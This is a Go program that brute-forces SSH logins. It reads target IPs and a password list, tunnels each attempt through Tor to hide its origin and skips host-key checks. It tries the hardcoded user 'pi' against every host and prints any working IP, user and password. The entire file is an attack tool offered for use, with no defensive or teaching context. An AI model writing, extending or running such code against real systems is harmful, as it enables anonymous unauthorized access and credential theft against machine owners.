package main

import (
	"bufio"
	"flag"
	"fmt"
	"golang.org/x/crypto/ssh"
	"golang.org/x/net/proxy"
	"net"
	"net/url"
	"os"
	"syscall"
	"time"
)

var (
	passFile = flag.String("pass", "passfile.txt", "Password list to use.")
	ipFile   = flag.String("ip", "ipfile.txt", "Ip list to attack.")
	port     = flag.String("port", "22", "Port to attempt ssh connection.")
	user     = flag.String("user", "root", "User to attempt connection.")
	timeout  = flag.Duration("timeout", 10000*time.Millisecond, "Timeout per ssh request.")
)

// Struct with authentication info
type AuthResult struct {
	Ip   string
	Port string
	User string
	Pass string
}

type fileScanner struct {
	File    *os.File
	Scanner *bufio.Scanner
	Values  []string
}

func newFileScanner(path string) (*fileScanner, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	fScanner := &fileScanner{File: file, Scanner: scanner}
	return fScanner, nil
}

func (f *fileScanner) Load() {
	scanner := bufio.NewScanner(f.File)
	scanner.Split(bufio.ScanLines)
	var values []string
	for scanner.Scan() {
		value := scanner.Text()
		values = append(values, value)
	}
	f.Values = values

}

// Creates a ssh client with a routed *net.Conn
func TorClient(addr string, config *ssh.ClientConfig) (*ssh.Client, error) {
	proxyURL, _ := url.Parse("socks5://127.0.0.1:9050")
	dialer, err := proxy.FromURL(proxyURL, proxy.Direct)
	if err != nil {
		return nil, err
	}
	perHost := proxy.NewPerHost(dialer, nil)
	conn, err := perHost.Dial("tcp", addr)
	if err != nil {
		//panic(err)
		return nil, err
	}
	c, chans, reqs, err := ssh.NewClientConn(conn, addr, config)
	if err != nil {
		return nil, err
	}
	return ssh.NewClient(c, chans, reqs), nil
}

func sshDialer(ip, port, user, password string, resCh chan *AuthResult) {
	config := &ssh.ClientConfig{

		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		Timeout:         *timeout,
	}
	finish := make(chan bool)
	for {
		go func() {
			client, err := TorClient(ip+":"+port, config)
			if err == nil {
				fmt.Printf("%#v\n", client)
				res := &AuthResult{Ip: ip, Port: port, User: user, Pass: password}
				fmt.Printf("Found! IP: \"%v:%v\", user \"%v\" pass: \"%v\".\n", ip, port, user, password)
				finish <- true
				resCh <- res
			}
			switch err.(type) {
			case *net.OpError:
				errN := err.(*net.OpError).Err
				sc := errN.(*os.SyscallError)
				if sc.Err == syscall.Errno(0x6f) {
					fmt.Println("Proxy connection refused, is Tor running?")
					os.Exit(1)
				}

			}

		}()
		select {
		case <-finish:
		case <-time.After(*timeout):
			resCh <- nil
		}
		break
	}

}

func main() {
	flag.Parse()
	ip, err := newFileScanner(*ipFile)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	pass, err := newFileScanner(*passFile)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	pass.Load()
	resCh := make(chan *AuthResult)
	attempts := 0
	checked := 0
	fmt.Println("Launching ssh auth requests...")
	t0 := time.Now()
	defer ip.File.Close()
	defer pass.File.Close()
	for ip.Scanner.Scan() {
		for _, passwd := range pass.Values {
			//for pass.Scanner.Scan() {
			ipAddr := ip.Scanner.Text()
			//passwd := pass.Scanner.Text()
			if err := ip.Scanner.Err(); err != nil {
				return
			}
			//fmt.Println("trying ", ipAddr, passwd)
			go sshDialer(ipAddr, *port, "pi", passwd, resCh)
			attempts++
		}
	}
	for res := range resCh {
		checked++
		if checked == attempts {
			break
		}
		if res == nil {
			continue
		}
	}
	t1 := time.Since(t0)
	fmt.Printf("Finished %v requests, %.2f seconds, RPS: %.4f\n, ", attempts, t1.Seconds(), float64(attempts)/t1.Seconds())
}
